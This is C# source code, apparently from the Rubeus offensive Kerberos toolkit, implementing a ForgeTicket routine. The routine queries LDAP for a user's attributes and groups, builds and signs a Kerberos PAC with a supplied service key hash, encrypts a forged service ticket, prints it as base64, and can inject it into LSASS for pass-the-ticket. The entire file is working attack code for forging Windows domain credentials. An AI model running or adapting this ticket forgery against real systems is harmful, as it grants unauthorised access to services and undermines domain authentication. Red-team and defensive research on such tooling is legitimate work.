using System;
using System.Text;
using System.Security.Principal;
using System.Collections.Generic;
using System.DirectoryServices;
using Rubeus.lib.Interop;
using Rubeus.Kerberos.PAC;
using Rubeus.Kerberos;

namespace Rubeus
{
    public class ForgeTickets
    {
        public static void ForgeTicket(string user, string sname, string keyString, Interop.KERB_ETYPE etype, bool fromldap = false, string sid = "", string domain = "", string domainController = "", int uid = 500, string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
        {
            // initialise LogonInfo section
            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();

            // determine domain if not supplied
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] Referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }

            // if /fromldap was passed make the LDAP query
            if (fromldap)
            {
                DirectoryEntry directoryObject = null;
                DirectorySearcher userSearcher = null;

                try
                {
                    if (String.IsNullOrEmpty(domainController))
                    {
                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                    }
                    directoryObject = Networking.GetLdapSearchRoot(null, "", domainController, domain);
                    userSearcher = new DirectorySearcher(directoryObject);
                    // enable LDAP paged search to get all results, by pages of 1000 items
                    userSearcher.PageSize = 1000;
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                try
                {
                    string userSearchFilter = "";

                    userSearchFilter = String.Format("(&(samAccountName={0}))", user);
                    userSearcher.Filter = userSearchFilter;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                    return;
                }

                try
                {
                    SearchResultCollection users = userSearcher.FindAll();

                    if (users.Count == 0)
                    {
                        Console.WriteLine("[X] No users returned by LDAP!");
                        return;
                    }

                    foreach (SearchResult u in users)
                    {
                        kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(u.Properties["samAccountName"][0].ToString());
                        kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["name"][0].ToString());
                        string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
                        string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                        kvi.LogonCount = short.Parse(u.Properties["logoncount"][0].ToString());
                        kvi.BadPasswordCount = short.Parse(u.Properties["badpwdcount"][0].ToString());
                        kvi.LogonTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));
                        kvi.LogoffTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogoff"][0]));
                        kvi.PasswordLastSet = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["pwdlastset"][0]));
                        kvi.PrimaryGroupId = (int)u.Properties["primarygroupid"][0];
                        kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-')+1));
                        kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                        if (u.Properties["homedirectory"].Count > 0)
                        {
                            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(u.Properties["homedirectory"][0].ToString());
                        }
                        if (u.Properties["homedrive"].Count > 0)
                        {
                            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(u.Properties["homedrive"][0].ToString());
                        }
                        if (u.Properties["profilepath"].Count > 0)
                        {
                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["profilepath"][0].ToString());
                        }
                        if (u.Properties["scriptpath"].Count > 0)
                        {
                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
                        }

                        kvi.GroupCount = u.Properties["memberof"].Count;
                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[u.Properties["memberof"].Count];
                        int c = 0;
                        if (u.Properties["memberof"].Count > 0)
                        {
                            try
                            {
                                string groupSearchFilter = "";
                                foreach (string groupDN in u.Properties["memberof"])
                                {
                                    groupSearchFilter += String.Format("(distinguishedname={0})", groupDN);
                                }
                                userSearcher.Filter = String.Format("(|{0})", groupSearchFilter);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                                return;
                            }

                            try
                            {
                                SearchResultCollection groups = userSearcher.FindAll();

                                if (groups.Count == 0)
                                {
                                    Console.WriteLine("[X] No groups returned by LDAP!");
                                    return;
                                }

                                foreach (SearchResult g in groups)
                                {
                                    string groupSid = (new SecurityIdentifier((byte[])g.Properties["objectsid"][0], 0)).Value;
                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 0) }, 0, kvi.GroupIds, c, 1);
                                    c += 1;
                                }
                            }
                            catch (Exception ex)
                            {
                                if (ex.InnerException != null)
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                                }
                                else
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                                }
                                return;
                            }
                        }

                        /*Console.WriteLine("[*] SamAccountName         : {0}", u.Properties["samAccountName"][0].ToString());
                        Console.WriteLine("[*] Domain SID             : {0}", domainSid);
                        Console.WriteLine("[*] Last Logon             : {0}", DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));*/
                    }
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

            }

            // initialize some structures
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            // overwrite any LogonInfo fields here sections
            kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING("CHOCOLATE");
            kvi.UserAccountControl = 528;
            kvi.UserFlags = 544;
            kvi.SidCount = 1;
            kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                    new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 0)};
            LogonInfo li = new LogonInfo(kvi);


            ClientName cn = new ClientName(DateTime.Now, user);
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            int sigLength = 12;

            // generate a random session key
            Random random = new Random();
            byte[] randKeyBytes;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                sigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags);

            // generate clear signatures
            svrSigData.Signature = new byte[sigLength];
            kdcSigData.Signature = new byte[sigLength];
            Array.Clear(svrSigData.Signature, 0, sigLength);
            Array.Clear(kdcSigData.Signature, 0, sigLength);

            // get the key from keyString
            byte[] key = Helpers.StringToByteArray(keyString);

            // add sections to the PAC, get bytes and generate checksums
            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
            PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
            byte[] ptBytes = pt.Encode();
            byte[] svrSig = Crypto.KerberosChecksum(key, ptBytes, svrSigData.SignatureType);
            byte[] kdcSig = Crypto.KerberosChecksum(key, svrSig, kdcSigData.SignatureType);

            // add checksums
            svrSigData.Signature = svrSig;
            kdcSigData.Signature = kdcSig;
            PacInfoBuffers = new List<PacInfoBuffer>();
            PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            pt = new PACTYPE(0, PacInfoBuffers);

            // add the PAC to the ticket
            decTicketPart.SetPac(pt);


            // encrypt the EncTicketPart
            byte[] encTicketData = decTicketPart.Encode().Encode();
            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);

            // initialize the ticket and add the enc_part
            Ticket ticket = new Ticket(domain.ToUpper(), sname);
            ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

            // add the ticket
            cred.tickets.Add(ticket);

            // [0] add in the session key
            info.key.keytype = (int)etype;
            info.key.keyvalue = randKeyBytes;

            // [1] prealm (domain)
            info.prealm = decTicketPart.crealm;

            // [2] pname (user)
            info.pname.name_type = decTicketPart.cname.name_type;
            info.pname.name_string = decTicketPart.cname.name_string;

            // [3] flags
            info.flags = flags;

            // [4] authtime (not required)
            info.authtime = decTicketPart.authtime;

            // [5] starttime
            info.starttime = decTicketPart.starttime;

            // [6] endtime
            info.endtime = decTicketPart.endtime;

            // [7] renew-till
            info.renew_till = decTicketPart.renew_till;

            // [8] srealm
            info.srealm = ticket.realm;

            // [9] sname
            info.sname.name_type = ticket.sname.name_type;
            info.sname.name_string = ticket.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

            if (Program.wrapTickets)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }

            Console.WriteLine("");

            if (!String.IsNullOrEmpty(outfile))
            {
                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                filename = Helpers.MakeValidFileName(filename);
                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                {
                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                }
            }

            if (ptt)
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, new LUID());
            }
        }
    }
}
